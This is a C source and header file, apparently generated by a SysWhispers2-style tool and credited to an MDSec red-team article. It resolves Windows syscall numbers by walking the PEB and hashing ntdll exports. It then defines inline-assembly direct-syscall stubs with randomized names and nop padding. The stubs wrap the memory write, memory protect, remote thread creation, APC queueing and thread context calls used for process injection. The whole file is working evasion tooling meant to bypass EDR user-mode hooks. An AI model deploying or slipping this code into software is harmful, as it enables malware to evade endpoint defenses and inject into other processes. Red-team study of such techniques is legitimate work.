#pragma once

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

#ifndef SW2_HEADER_H_
#define SW2_HEADER_H_

#include <windows.h>

#define SW2_SEED 0xDB4F38C0
#define SW2_ROL8(v) (v << 8 | v >> 24)
#define SW2_ROR8(v) (v >> 8 | v << 24)
#define SW2_ROX8(v) ((SW2_SEED % 2) ? SW2_ROL8(v) : SW2_ROR8(v))
#define SW2_MAX_ENTRIES 500
#define SW2_RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)

// Typedefs are prefixed to avoid pollution.

typedef struct _SW2_SYSCALL_ENTRY
{
    DWORD Hash;
    DWORD Address;
} SW2_SYSCALL_ENTRY, *PSW2_SYSCALL_ENTRY;

typedef struct _SW2_SYSCALL_LIST
{
    DWORD Count;
    SW2_SYSCALL_ENTRY Entries[SW2_MAX_ENTRIES];
} SW2_SYSCALL_LIST, *PSW2_SYSCALL_LIST;

typedef struct _SW2_PEB_LDR_DATA {
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} SW2_PEB_LDR_DATA, *PSW2_PEB_LDR_DATA;

typedef struct _SW2_LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
} SW2_LDR_DATA_TABLE_ENTRY, *PSW2_LDR_DATA_TABLE_ENTRY;

typedef struct _SW2_PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PSW2_PEB_LDR_DATA Ldr;
} SW2_PEB, *PSW2_PEB;

DWORD SW2_HashSyscall(PCSTR FunctionName);
BOOL SW2_PopulateSyscallList();
EXTERN_C DWORD GETSYSCALLNUMBER(DWORD FunctionHash);


typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

typedef VOID(KNORMAL_ROUTINE) (
	IN PVOID NormalContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2);

/*
typedef enum _PROCESSINFOCLASS
{
	ProcessBasicInformation = 0,
	ProcessDebugPort = 7,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessBreakOnTermination = 29
} PROCESSINFOCLASS, *PPROCESSINFOCLASS;
*/

typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

EXTERN_C NTSTATUS ULCOyxxuXpdHFQpIRaq(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);

EXTERN_C NTSTATUS VBWZrKsBoLvypfMdGiY(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress OPTIONAL,
	OUT PVOID Buffer,
	IN SIZE_T BufferSize,
	OUT PSIZE_T NumberOfBytesRead OPTIONAL);

EXTERN_C NTSTATUS CFFWWXCicWwlMtUWPiq(
	IN HANDLE ProcessHandle,
	IN OUT PVOID * BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS dAcoeKoZfeQqefCKmfL(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

EXTERN_C NTSTATUS jSSHWODQCSfFvsqeybS(
	IN HANDLE ThreadHandle,
	IN OUT PULONG PreviousSuspendCount OPTIONAL);

EXTERN_C NTSTATUS FJVRYUhESfdyyGqRcdB(
	IN HANDLE Handle);

EXTERN_C NTSTATUS mzOHQwCHUQRVhBnajah(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId OPTIONAL);

EXTERN_C NTSTATUS UWhhRtOqCgYZJITxsMU(
	IN HANDLE ProcessHandle,
	IN OUT PVOID * BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect);

EXTERN_C NTSTATUS ZVRWCfQPkXiwKuPFjgH(
	OUT PHANDLE ThreadHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ProcessHandle,
	IN PVOID StartRoutine,
	IN PVOID Argument OPTIONAL,
	IN ULONG CreateFlags,
	IN SIZE_T ZeroBits,
	IN SIZE_T StackSize,
	IN SIZE_T MaximumStackSize,
	IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

EXTERN_C NTSTATUS LQBeZBYzDauPrjOanHc(
	IN HANDLE ObjectHandle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER TimeOut OPTIONAL);

EXTERN_C NTSTATUS YfGtvOYIRHKzAOnLqav(
	IN HANDLE ThreadHandle,
	IN PKNORMAL_ROUTINE ApcRoutine,
	IN PVOID ApcArgument1 OPTIONAL,
	IN PVOID ApcArgument2 OPTIONAL,
	IN PVOID ApcArgument3 OPTIONAL);

EXTERN_C NTSTATUS RsXhGZjxZmeWQCaSxOu(
	IN HANDLE ThreadHandle,
	OUT PULONG PreviousSuspendCount OPTIONAL);

EXTERN_C NTSTATUS genWXXsNrMcFXonIght(
	IN HANDLE ThreadHandle,
	IN OUT PCONTEXT ThreadContext);

EXTERN_C NTSTATUS wzMUOQSewVTFxzpskuU(
	IN HANDLE ThreadHandle,
	IN PCONTEXT Context);

EXTERN_C NTSTATUS ZEubHuHMOhdvsCxCdzn(
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER DelayInterval);

#endif


// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

SW2_SYSCALL_LIST SW2_SyscallList = {0,1};

DWORD SW2_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW2_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
        Hash ^= PartialName + SW2_ROR8(Hash);
    }

    return Hash;
}

BOOL SW2_PopulateSyscallList()
{
    // Return early if the list is already populated.
    if (SW2_SyscallList.Count) return TRUE;

    PSW2_PEB Peb = (PSW2_PEB)__readgsqword(0x60);
    PSW2_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PSW2_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW2_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW2_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = SW2_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

        if ((*(ULONG*)DllName | 0x20202020) != 'ldtn') continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 'ld.l') break;
    }

    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW2_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    // Populate SW2_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PSW2_SYSCALL_ENTRY Entries = SW2_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = SW2_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        // Is this a system call?
        if (*(USHORT*)FunctionName == 'wZ')
        {
            Entries[i].Hash = SW2_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == SW2_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);

    // Save total number of system calls found.
    SW2_SyscallList.Count = i;

    // Sort the list by address in ascending order.
    for (DWORD i = 0; i < SW2_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SW2_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                // Swap entries.
                SW2_SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    return TRUE;
}

EXTERN_C DWORD GETSYSCALLNUMBER(DWORD FunctionHash)
{
    // Ensure SW2_SyscallList is populated.
    if (!SW2_PopulateSyscallList()) return -1;

    for (DWORD i = 0; i < SW2_SyscallList.Count; i++)
    {
        if (FunctionHash == SW2_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}
#define ULCOyxxuXpdHFQpIRaq ULCOyxxuXpdHFQpIRaq
__asm__("ULCOyxxuXpdHFQpIRaq: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x082189195\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define VBWZrKsBoLvypfMdGiY VBWZrKsBoLvypfMdGiY
__asm__("VBWZrKsBoLvypfMdGiY: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x04216568B\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define CFFWWXCicWwlMtUWPiq CFFWWXCicWwlMtUWPiq
__asm__("CFFWWXCicWwlMtUWPiq: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x031A23F35\n\
	nop\n\
	nop\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define dAcoeKoZfeQqefCKmfL dAcoeKoZfeQqefCKmfL
__asm__("dAcoeKoZfeQqefCKmfL: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x003952937\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	syscall\n\
	ret\n\
");
#define jSSHWODQCSfFvsqeybS jSSHWODQCSfFvsqeybS
__asm__("jSSHWODQCSfFvsqeybS: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x068CE5A67\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	syscall\n\
	ret\n\
");
#define FJVRYUhESfdyyGqRcdB FJVRYUhESfdyyGqRcdB
__asm__("FJVRYUhESfdyyGqRcdB: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x04ED5B749\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	syscall\n\
	ret\n\
");
#define mzOHQwCHUQRVhBnajah mzOHQwCHUQRVhBnajah
__asm__("mzOHQwCHUQRVhBnajah: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x0F93ADEA8\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define UWhhRtOqCgYZJITxsMU UWhhRtOqCgYZJITxsMU
__asm__("UWhhRtOqCgYZJITxsMU: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x01D950B1B\n\
	nop\n\
	nop\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define ZVRWCfQPkXiwKuPFjgH ZVRWCfQPkXiwKuPFjgH
__asm__("ZVRWCfQPkXiwKuPFjgH: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x00DA2CEFE\n\
	nop\n\
	nop\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define LQBeZBYzDauPrjOanHc LQBeZBYzDauPrjOanHc
__asm__("LQBeZBYzDauPrjOanHc: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x01AA32E1B\n\
	nop\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define YfGtvOYIRHKzAOnLqav YfGtvOYIRHKzAOnLqav
__asm__("YfGtvOYIRHKzAOnLqav: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x0AC80B626\n\
	nop\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define RsXhGZjxZmeWQCaSxOu RsXhGZjxZmeWQCaSxOu
__asm__("RsXhGZjxZmeWQCaSxOu: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x022811E21\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define genWXXsNrMcFXonIght genWXXsNrMcFXonIght
__asm__("genWXXsNrMcFXonIght: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x0329CFC36\n\
	nop\n\
	nop\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define wzMUOQSewVTFxzpskuU wzMUOQSewVTFxzpskuU
__asm__("wzMUOQSewVTFxzpskuU: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x0B89F3EB5\n\
	nop\n\
	nop\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
#define ZEubHuHMOhdvsCxCdzn ZEubHuHMOhdvsCxCdzn
__asm__("ZEubHuHMOhdvsCxCdzn: \n\
	mov [rsp +8], rcx\n\
	mov [rsp+16], rdx\n\
	mov [rsp+24], r8\n\
	mov [rsp+32], r9\n\
	sub rsp, 0x28\n\
	mov ecx, 0x0FCBE3BEA\n\
	nop\n\
	nop\n\
	nop\n\
	call GETSYSCALLNUMBER\n\
	add rsp, 0x28\n\
	mov rcx, [rsp +8]\n\
	mov rdx, [rsp+16]\n\
	mov r8, [rsp+24]\n\
	mov r9, [rsp+32]\n\
	mov r10, rcx\n\
	nop\n\
	nop\n\
	nop\n\
	syscall\n\
	ret\n\
");
